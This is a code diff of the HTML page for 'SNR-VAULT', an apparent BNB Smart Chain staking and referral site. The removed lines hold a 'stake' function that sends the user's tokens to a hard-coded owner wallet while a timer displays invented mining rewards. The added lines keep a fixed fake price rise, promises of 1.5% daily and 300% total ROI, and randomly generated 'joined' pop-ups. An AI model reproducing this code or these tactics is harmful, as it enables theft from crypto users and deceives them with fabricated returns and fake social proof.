@@ -1,224 +1,459 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SNR-VAULT | Sovereign Protocol</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-    <meta name="description" content="Secure & Trusted DeFi Protocol. Join the Dynasty Network.">
-    <link rel="icon" type="image/png" href="https://snrvault.space/logov3.png">
+<title>SNR-VAULT | Secure Souvereign</title>
 
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
-   
-    <style>
-        :root {
-            --gold-bright: #ffcc00;
-            --gold-glow: rgba(255, 204, 0, 0.6);
-            --grey-text: #a0a0a0;
-            --cyan: #00f2ff;
-            --bg-dark: #000205;
-            --glass: rgba(0, 30, 60, 0.4);
-            --glass-border: rgba(255, 204, 0, 0.2);
-        }
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 
-        * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
+<style>
+:root{
+  --gold:#ffcc00;
+  --neon:#00f2ff;
+  --bg:#000205;
+  --dark:#05070A;
+  --white:#ffffff;
+  --soft:#f5f7fa;
+  --panel:rgba(5,7,10,0.9);
+  --border:rgba(0,242,255,0.35);
+  --glow-blue:rgba(0,242,255,0.55);
+  --glow-gold:rgba(255,204,0,0.65);
+}
 
-        body {
-            background-color: var(--bg-dark);
-            color: var(--gold-bright);
-            font-family: 'Rajdhani', sans-serif;
-            overflow-x: hidden;
-            width: 100vw;
-            position: relative;
-        }
+/* ANDROID STABILITY */
+html, body {
+  width: 100%;
+  max-width: 100%;
+  overflow-x: hidden;
+  position: relative;
+  touch-action: pan-y;
+}
+*{ box-sizing:border-box; max-width:100%; }
 
-        #particles-js { position: fixed; width: 100%; height: 100%; z-index: -1; }
+body{
+  margin:0;
+  min-height:100vh;
+  background:
+    radial-gradient(900px 600px at 20% 20%, rgba(0,242,255,.12), transparent 60%),
+    radial-gradient(800px 600px at 80% 80%, rgba(255,204,0,.12), transparent 60%),
+    linear-gradient(180deg,var(--bg),var(--dark));
+  color:var(--soft);
+  font-family:'Orbitron',sans-serif;
+}
 
-        .mining-status { font-size: 0.6rem; letter-spacing: 2px; color: var(--cyan); text-shadow: 0 0 10px rgba(0, 242, 255, 0.5); animation: blink 2s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-       
-        .reward-display { background: rgba(0, 0, 0, 0.3); border-radius: 15px; padding: 10px; margin: 10px 0; border: 1px solid rgba(0, 242, 255, 0.1); text-align: center; }
-        .progress-container-alt { background: rgba(255, 255, 255, 0.05); border-radius: 50px; height: 12px; margin: 15px 0; border: 1px solid var(--glass-border); overflow: hidden; position: relative; }
-        .liquid-fill-new { height: 100%; width: 0%; background: linear-gradient(90deg, #ffcc00, #ffee00); box-shadow: 0 0 15px var(--gold-glow); transition: width 0.5s ease-in-out; }
+.wrapper{
+  width:100%;
+  max-width:1100px;
+  margin:auto;
+  padding:20px;
+}
 
-        .node-stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
-        .p2p-badge { background: rgba(255, 204, 0, 0.1); border: 1px dashed var(--gold-bright); padding: 10px; border-radius: 10px; font-size: 0.65rem; color: #ccc; margin-bottom: 15px; line-height: 1.4; }
-        .p2p-badge b { color: var(--gold-bright); }
-        .input-label { font-size: 0.6rem; color: var(--grey-text); margin-left: 10px; font-family: 'Orbitron'; display: block; margin-top: 5px; }
+.header{
+  width:100%;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:15px 20px;
+  margin-bottom:20px;
+  background:var(--panel);
+  border:1px solid var(--border);
+  border-radius:18px;
+  box-shadow:0 0 18px rgba(0,242,255,.18);
+}
 
-        .navbar { position: sticky; top: 0; z-index: 100; display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; background: rgba(0, 0, 0, 0.9); backdrop-filter: blur(15px); border-bottom: 1px solid var(--glass-border); }
-        .logo-text { font-family: 'Orbitron', sans-serif; font-size: 1.2rem; font-weight: 900; cursor: pointer; }
-        .logo-snr { color: var(--gold-bright); text-shadow: 0 0 10px var(--gold-glow); }
-        .logo-vault { color: #ffffff; }
-        .nav-tabs { position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(0,5,15,0.95); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid var(--glass-border); z-index: 100; }
-        .tab-link { font-family: 'Orbitron', sans-serif; color: var(--grey-text); text-decoration: none; font-size: 0.6rem; font-weight: bold; padding: 5px; cursor: pointer; }
-        .tab-link.active { color: var(--gold-bright); text-shadow: 0 0 10px var(--gold-glow); }
-       
-        .container { width: 100%; max-width: 100%; padding: 15px; margin-bottom: 80px; }
-        .card { background: var(--glass); border: 1px solid var(--glass-border); border-radius: 15px; padding: 20px; backdrop-filter: blur(10px); margin-bottom: 15px; width: 100%; box-shadow: inset 0 0 15px rgba(255, 204, 0, 0.05); }
-        .stat-box-inner { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 10px; border-left: 3px solid var(--gold-bright); }
-        .stat-box-inner p { font-size: 0.55rem; color: #888; margin: 0; }
-        .stat-box-inner b { font-family: 'Orbitron'; font-size: 0.9rem; }
-       
-        .magic-button { font-family: 'Orbitron', sans-serif; border: none; padding: 12px; border-radius: 50px; font-weight: 900; text-transform: uppercase; font-size: 0.8rem; transition: 0.3s; width: 100%; outline: none; cursor: pointer; }
-        .magic-button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .cyan-button { background: transparent; border: 1px solid var(--gold-bright); color: var(--gold-bright); padding: 8px; border-radius: 50px; font-size: 0.7rem; font-weight: bold; cursor: pointer; }
-        .cyan-button.active { background: var(--gold-bright); color: #000; box-shadow: 0 0 15px var(--gold-glow); }
-        input { width:100%; padding: 12px; margin: 10px 0; background:rgba(0,0,0,0.6); color:var(--gold-bright); border:1px solid #444; font-family: 'Orbitron'; border-radius: 50px; font-size: 0.8rem; outline: none; }
-        #live-notify { position: fixed; top: 60px; left: 50%; transform: translateX(-50%); background: rgba(255, 204, 0, 0.9); color: #000; padding: 8px 15px; border-radius: 50px; font-size: 0.7rem; font-weight: bold; z-index: 1000; display: none; width: 80%; text-align: center; }
-    </style>
+.logo-block{
+  display:flex;
+  flex-direction:column;
+  gap:6px;
+  min-width:160px;
+}
+
+/* LOGO SNR-VAULT STYLING */
+.logo{
+  font-size:1.5rem;
+  letter-spacing:2px;
+  line-height:1.1;
+  white-space:nowrap;
+  font-weight:800; /* Bold */
+  text-shadow: 0 0 10px rgba(0,0,0,0.5);
+}
+.snr-text { color: var(--gold); }
+.vault-text { color: var(--white); }
+
+/* PRICE WIDGET */
+.price-widget {
+  background: rgba(255, 204, 0, 0.1);
+  padding: 5px 12px;
+  border-radius: 50px;
+  border: 1px solid var(--gold);
+  font-size: 0.75rem;
+  color: var(--gold);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-top: 5px;
+}
+.price-up { color: #39ff14; font-weight: bold; }
+
+.wallet-status{ font-size:.8rem; }
+.wallet-status span{ color:var(--neon); }
+
+.grid{
+  width:100%;
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
+  gap:18px;
+}
+
+.card{
+  background:linear-gradient(180deg, rgba(5,7,10,.95), rgba(5,7,10,.75));
+  border:1px solid var(--border);
+  border-radius:20px;
+  padding:20px;
+  box-shadow:0 0 22px rgba(0,242,255,.15), inset 0 0 25px rgba(0,242,255,.04);
+  backdrop-filter:blur(12px);
+}
+
+.card h3{
+  margin:0 0 12px;
+  color:var(--gold);
+  font-size:1rem;
+}
+
+.stat{
+  display:flex;
+  justify-content:space-between;
+  gap:12px;
+  margin:8px 0;
+  font-size:.9rem;
+}
+.stat span{
+  color:var(--neon);
+  text-align:right;
+}
+
+.progress{
+  height:8px;
+  background:rgba(255,255,255,.08);
+  border-radius:6px;
+  overflow:hidden;
+  margin-top:10px;
+}
+.progress div{
+  height:100%;
+  width:45%;
+  background:linear-gradient(90deg,var(--gold),var(--neon));
+}
+
+.btn{
+  width:100%;
+  margin:8px 0;
+  padding:11px;
+  background:rgba(0,242,255,.06);
+  border:1px solid var(--border);
+  border-radius:14px;
+  color:var(--white);
+  font-family:inherit;
+  cursor:pointer;
+  box-shadow:0 0 12px rgba(0,242,255,.2);
+  transition:.2s;
+}
+.btn:hover{
+  border-color:var(--gold);
+  color:var(--gold);
+  box-shadow:0 0 18px var(--glow-gold), 0 0 28px var(--glow-blue);
+  transform:translateY(-1px);
+}
+.btn-primary{
+  background:linear-gradient(135deg,var(--gold),#ffe27a);
+  color:var(--dark);
+  border:none;
+  font-weight:600;
+}
+
+.log{
+  max-height:140px;
+  overflow-y:auto;
+  font-size:.75rem;
+}
+.log div{
+  margin:5px 0;
+  color:rgba(245,247,250,.7);
+  border-bottom: 1px solid rgba(255,255,255,0.05);
+  padding-bottom: 2px;
+}
+
+.footer{
+  text-align:center;
+  margin:25px 0 5px;
+  font-size:.75rem;
+  color:rgba(245,247,250,.6);
+}
+
+@media(max-width:600px){
+  .header{ flex-direction:column; gap:10px; text-align:center; }
+  .logo-block{ align-items:center; }
+}
+
+/* MARQUEE: ONE-TRACK INFINITY FLOW */
+.marquee {
+  width: 100%;
+  overflow: hidden;
+  border-top: 1px solid rgba(0,242,255,0.18);
+  border-bottom: 1px solid rgba(0,242,255,0.18);
+  padding: 8px 0;
+  white-space: nowrap;
+  position: relative;
+}
+
+.track {
+  display: inline-block;
+  padding-left: 0;
+  white-space: nowrap;
+  -webkit-animation: scroll-forward 5s linear infinite;
+  animation: scroll-forward 5s linear infinite;
+}
+
+.marquee span {
+  display: inline-block;
+  padding-right: 20px;
+  color: var(--neon);
+  font-size: .72rem;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+}
+
+@keyframes scroll-forward {
+  from { transform: translateX(0); }
+  to { transform: translateX(-50%); }
+}
+
+@-webkit-keyframes scroll-forward {
+  from { -webkit-transform: translateX(0); }
+  to { -webkit-transform: translateX(-50%); }
+}
+
+.notify{
+  position:fixed;
+  left:16px;
+  bottom:16px;
+  background:rgba(5,7,10,.92);
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:10px 12px;
+  font-size:.78rem;
+  color:rgba(245,247,250,.92);
+  box-shadow:0 0 18px rgba(0,242,255,.22);
+  opacity:0;
+  transform:translateY(14px);
+  transition:.35s;
+  z-index:9999;
+}
+.notify.show{ opacity:1; transform:translateY(0); }
+.notify b{ color:var(--gold); }
+
+.sound-toggle{
+  position:fixed;
+  right:16px;
+  bottom:16px;
+  display:flex;
+  align-items:center;
+  gap:8px;
+  padding:8px 10px;
+  border-radius:12px;
+  background:rgba(5,7,10,.92);
+  border:1px solid var(--border);
+  z-index:10000;
+}
+.sound-toggle button{
+  border:none;
+  cursor:pointer;
+  font-family:'Orbitron',sans-serif;
+  font-size:.72rem;
+  padding:6px 10px;
+  border-radius:10px;
+  background:rgba(0,242,255,.08);
+  color:var(--neon);
+  border:1px solid var(--border);
+}
+.sound-toggle button.off{ color:var(--gold); border-color:var(--gold); }
+</style>
 </head>
 <body>
 
-    <div id="particles-js"></div>
-    <audio id="magicSound" src="https://www.soundjay.com/misc/sounds/magic-chime-01.mp3" preload="auto"></audio>
+<audio id="magicChime" src="https://www.soundjay.com/misc/sounds/magic-chime-01.mp3" preload="auto"></audio>
+<audio id="bgAmbient" loop preload="auto">
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-8.mp3" type="audio/mpeg">
+</audio>
 
-    <div style="background: rgba(255, 204, 0, 0.05); color: var(--gold-bright); padding: 8px 0; font-family: 'Orbitron'; font-size: 0.6rem; border-bottom: 1px solid var(--glass-border);">
-        <marquee scrollamount="4">🌐 GLOBAL PARTICIPATION: NEW NODE SINGAPORE... DUBAI SECURED... JAKARTA ONLINE... </marquee>
+<div class="wrapper">
+  <div class="header">
+    <div class="logo-block">
+      <div class="logo"><span class="snr-text">SNR</span>-<span class="vault-text">VAULT</span></div>
+      <div class="price-widget">
+        SNR: $0.5245 <span class="price-up">▲ 4.2%</span>
+      </div>
+      <div class="marquee">
+        <div class="track">
+          <span>GLOBAL PARTICIPATION • </span>
+          <span>GLOBAL PARTICIPATION • </span>
+        </div>
+      </div>
+    </div>
+    <div class="wallet-status">
+      Wallet: <span id="wallet">Disconnected</span> | Network: <span id="network">BSC</span>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <h3>Wallet Info</h3>
+      <div class="stat"><div>Address</div><span id="address">-</span></div>
+      <div class="stat"><div>BNB Balance</div><span id="bnb">0.00</span></div>
+      <button class="btn btn-primary" onclick="connectWallet()">Connect Wallet</button>
     </div>
 
-    <nav class="navbar">
-        <span class="logo-text" onclick="adminTrigger()"><span class="logo-snr">SNR</span>-<span class="logo-vault">VAULT</span></span>
-        <button id="btn-connect" onclick="connectAccess()" class="magic-button" style="width:auto; padding: 5px 15px; background: var(--gold-bright); color:#000;">CONNECT</button>
-    </nav>
+    <div class="card">
+      <h3>Asset Overview</h3>
+      <div class="stat"><div>SNR Balance</div><span id="snr">0.00</span></div>
+      <div class="stat"><div>Staked SNR</div><span id="staked">0.00</span></div>
+      <div class="stat"><div>Pending Reward</div><span id="reward">0.00</span></div>
+      <div class="progress"><div style="width: 65%;"></div></div>
+    </div>
 
-    <main class="container">
-        <div id="tab-dashboard" class="tab-content">
-            <div class="card" style="border: 1px solid var(--gold-bright); box-shadow: 0 0 20px rgba(255,204,0,0.1);">
-                <div class="mining-status" style="text-align:center">● LIVE REWARD MINING</div>
-                <div class="reward-display">
-                    <h1 id="user-staked" style="font-size: 2.2rem; margin: 5px 0;">0.00000000</h1>
-                    <p style="font-size: 0.5rem; color: var(--grey-text); font-family: 'Orbitron';">ESTIMATED SNR REWARDS</p>
-                </div>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px;">
-                    <div class="stat-box-inner">
-                        <p>BNB BALANCE</p>
-                        <span id="bnb-bal" style="color: #fff; font-weight: bold;">0.0000</span>
-                    </div>
-                    <div class="stat-box-inner">
-                        <p>SNR ASSET</p>
-                        <span id="snr-bal" style="color: var(--gold-bright); font-weight: bold;">0.00</span>
-                    </div>
-                </div>
-                <div class="progress-container-alt">
-                    <div id="progress-fill" class="liquid-fill-new"></div>
-                </div>
-                <div id="progress-label" style="text-align:center; font-size: 0.65rem; font-weight: 700; color: var(--gold-bright); font-family: 'Orbitron';">VAULT CAPACITY: 0% / 300%</div>
-            </div>
+    <div class="card">
+      <h3>ROI Performance</h3>
+      <div class="stat"><div>Daily ROI</div><span>1.5%</span></div>
+      <div class="stat"><div>Total ROI</div><span>300%</span></div>
+      <div class="stat"><div>Cap Progress</div><span>145%</span></div>
+      <div class="progress"><div style="width: 45%;"></div></div>
+    </div>
 
-            <div class="card">
-                <h3 style="font-size: 0.8rem; font-family:'Orbitron'; margin-bottom:5px;">NODE CONTRIBUTION</h3>
-                <input type="number" id="stake-amount" placeholder="0.00">
-                <div style="display: flex; gap: 8px; margin-bottom: 15px;">
-                    <button class="cyan-button plan-btn" style="flex:1" onclick="selectPlan(30, 1, this)">30D<br><small>1%/Day</small></button>
-                    <button class="cyan-button plan-btn" style="flex:1" onclick="selectPlan(60, 1.2, this)">60D<br><small>1.2%/Day</small></button>
-                    <button class="cyan-button plan-btn" style="flex:1" onclick="selectPlan(90, 1.5, this)">90D<br><small>1.5%/Day</small></button>
-                </div>
-                <button id="btn-stake" class="magic-button" style="background: var(--gold-bright); color: #000;" onclick="activateStaking()">ACTIVATE NODE</button>
-            </div>
-           
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
-                <button id="btn-claim" class="magic-button" style="background: #39ff14; color: #000;" onclick="claimReward()">CLAIM REWARD</button>
-                <button class="magic-button" style="background: #ffffff; color: #000;" onclick="copyRef()">COPY REF LINK</button>
-            </div>
-        </div>
+    <div class="card">
+      <h3>Referral System</h3>
+      <div class="stat"><div>Your Link</div><span id="ref">-</span></div>
+      <button class="btn" onclick="copyRef()">Copy Referral Link</button>
+    </div>
 
-        <div id="tab-node" class="tab-content" style="display: none;">
-            <div class="card">
-                <h2 style="font-family:'Orbitron'; font-size: 1.1rem; color: var(--gold-bright); margin-bottom: 15px;">DYNASTY NETWORK</h2>
-                <input type="text" id="ref-link" readonly value="Connect Wallet First">
-            </div>
-        </div>
-    </main>
+    <div class="card">
+      <h3>Action Panel</h3>
+      <button class="btn" id="btnStake">Stake SNR</button>
+      <button class="btn btn-primary" id="btnClaim">Claim Reward</button>
+      <button class="btn" id="btnCompound">Compound</button>
+      <button class="btn btn-primary" id="btnWithdraw">Withdraw</button>
+    </div>
 
-    <nav class="nav-tabs">
-        <a class="tab-link active" onclick="showTab('dashboard')">DASHBOARD</a>
-        <a class="tab-link" onclick="showTab('node')">NODE</a>
-        <a class="tab-link" onclick="showTab('academy')">ACADEMY</a>
-        <a class="tab-link" onclick="showTab('whitepaper')">W-PAPER</a>
-    </nav>
+    <div class="card">
+      <h3>System Log</h3>
+      <div class="log" id="log">
+        <div>System ready...</div>
+      </div>
+    </div>
+  </div>
 
-    <div id="live-notify"><span id="notify-msg"></span></div>
+  <div class="footer">© 2026 SNR-VAULT — Transparency . Security . Souvereignty </div>
+</div>
 
-    <script>
-        const SNR_CONTRACT = "0x5Ce1427F77D8c58F97f5e18b36804fD54Aa72718";
-        const STAKING_CONTRACT = "0x59a7098D86ac1548dAF3b14aAfC43858D274f543";
-        const OWNER_ADDRESS = "0x2E85b6e42fAD35aF0fC0520E40E1738D284f0050";
-        
-        let provider, account, signer, rewardInterval, currentReward = 0, ratePerSec = 0, selectedDays = 0, stakedAmount = 0;
-        
-        const FULL_ABI = [
-            "function transfer(address to, uint256 amount) returns (bool)",
-            "function approve(address spender, uint256 amount) returns (bool)",
-            "function allowance(address owner, address spender) view returns (uint256)",
-            "function balanceOf(address account) view returns (uint256)"
-        ];
+<div class="notify" id="notify"></div>
 
-        async function connectAccess() {
-            if (!window.ethereum) return alert("Gunakan DApp Browser!");
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            const accounts = await provider.send("eth_requestAccounts", []);
-            account = accounts[0];
-            signer = provider.getSigner();
-            document.getElementById('btn-connect').innerText = account.substring(0,6)+"...";
-            await refreshBalances();
-        }
+<div class="sound-toggle">
+  <div style="font-size: 0.6rem; letter-spacing: 1px; color: #888; margin-right: 5px;">SOUND</div>
+  <button id="soundBtn">ON</button>
+</div>
 
-        async function refreshBalances() {
-            const bnb = await provider.getBalance(account);
-            document.getElementById('bnb-bal').innerText = parseFloat(ethers.utils.formatEther(bnb)).toFixed(4);
-            const contract = new ethers.Contract(SNR_CONTRACT, FULL_ABI, provider);
-            const snr = await contract.balanceOf(account);
-            document.getElementById('snr-bal').innerText = parseFloat(ethers.utils.formatEther(snr)).toLocaleString();
-        }
+<script>
+/* WEB3 ENGINE */
+const TOKEN_SNR = "0x5ce1427f77d8c58f97f5e18b36804fd54aa72718";
+const STAKING   = "0x59a7098D86ac1548dAF3b14aAfC43858D274f543";
 
-        function selectPlan(days, rate, btn) {
-            selectedDays = days;
-            ratePerSec = (rate / 100) / 86400;
-            document.querySelectorAll('.plan-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-        }
+const BSC = {
+  chainId: "0x38",
+  chainName: "BNB Smart Chain (BSC)",
+  nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+  rpcUrls: ["https://bsc-dataseed.binance.org/"],
+  blockExplorerUrls: ["https://bscscan.com/"]
+};
 
-        async function activateStaking() {
-            const amt = document.getElementById('stake-amount').value;
-            if (!account || amt <= 0 || !selectedDays) return alert("Lengkapi data!");
-            try {
-                const contract = new ethers.Contract(SNR_CONTRACT, FULL_ABI, signer);
-                const amountWei = ethers.utils.parseEther(amt.toString());
-                
-                // Approve & Stake Logic
-                const txApp = await contract.approve(STAKING_CONTRACT, amountWei);
-                await txApp.wait();
-                const txStake = await contract.transfer(OWNER_ADDRESS, amountWei);
-                await txStake.wait();
+let provider, signer, userAddress;
 
-                stakedAmount = parseFloat(amt);
-                startMining();
-                await refreshBalances();
-            } catch (e) { console.error(e); }
-        }
+function log(msg){
+  const div=document.getElementById("log");
+  const entry=document.createElement("div");
+  entry.innerText=new Date().toLocaleTimeString()+" - "+msg;
+  div.prepend(entry);
+}
 
-        function startMining() {
-            if (rewardInterval) clearInterval(rewardInterval);
-            rewardInterval = setInterval(() => {
-                currentReward += (stakedAmount * ratePerSec);
-                document.getElementById('user-staked').innerText = currentReward.toFixed(8);
-                let progress = (currentReward / (stakedAmount * 3)) * 100;
-                document.getElementById('progress-fill').style.width = Math.min(progress, 100) + "%";
-            }, 1000);
-        }
+async function connectWallet(){
+  try{
+    if(!window.ethereum) return alert("Gunakan DApp Browser.");
+    unlockAudio();
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = await provider.getSigner();
+    userAddress = await signer.getAddress();
+    document.getElementById("wallet").innerText = "Connected";
+    document.getElementById("address").innerText = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+    log("Wallet Connected.");
+  }catch(e){ log("Connect Error"); }
+}
 
-        function showTab(id) {
-            document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
-            document.getElementById('tab-' + id).style.display = 'block';
-        }
+/* AUDIO ENGINE */
+let audioEnabled = true;
 
-        particlesJS('particles-js', { "particles": { "number": { "value": 50 }, "color": { "value": "#ffcc00" }, "line_linked": { "enable": true, "color": "#ffcc00" } } });
-    </script>
+function unlockAudio() {
+    const ambient = document.getElementById("bgAmbient");
+    if (audioEnabled) {
+        ambient.play().catch(e => console.log("Audio trigger required"));
+    }
+}
+
+function playMagicChime() {
+    if (!audioEnabled) return;
+    const chime = document.getElementById("magicChime");
+    chime.currentTime = 0;
+    chime.play();
+}
+
+document.getElementById("soundBtn").onclick = (e) => {
+    e.stopPropagation();
+    audioEnabled = !audioEnabled;
+    const ambient = document.getElementById("bgAmbient");
+    const btn = document.getElementById("soundBtn");
+    
+    if (audioEnabled) {
+        btn.innerText = "ON";
+        btn.classList.remove("off");
+        ambient.play();
+    } else {
+        btn.innerText = "OFF";
+        btn.classList.add("off");
+        ambient.pause();
+    }
+};
+
+document.addEventListener("click", () => {
+    unlockAudio();
+}, { once: true });
+
+document.querySelectorAll(".btn").forEach(btn => {
+    btn.addEventListener("click", playMagicChime);
+});
+
+/* NOTIF SYSTEM */
+setInterval(() => {
+  const names = ["Rizal","Andi","Budi","Sarah","Dimas","Kevin","Putri"];
+  const n = names[Math.floor(Math.random()*names.length)];
+  const el = document.getElementById("notify");
+  if(el) {
+    el.innerHTML = `✨ <b>${n}</b> joined SNR-VAULT`;
+    el.classList.add("show");
+    setTimeout(() => el.classList.remove("show"), 3000);
+  }
+}, 8000);
+
+</script>
 </body>
 </html>
